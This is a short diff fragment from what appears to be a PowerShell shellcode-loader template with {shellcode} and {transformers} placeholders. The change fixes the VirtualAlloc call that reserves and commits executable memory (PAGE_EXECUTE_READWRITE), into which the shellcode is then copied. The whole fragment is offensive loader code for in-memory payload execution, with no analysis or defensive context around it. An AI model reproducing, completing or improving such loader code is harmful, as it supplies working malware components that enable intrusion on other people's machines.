@@ -35,7 +35,7 @@ Add-Type -TypeDefinition $Kernel32 -ErrorAction SilentlyContinue
 {shellcode}
 {transformers}
 
-$addr = [Kernel32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)
+$addr = [Kernel32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
 
 [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length)
 
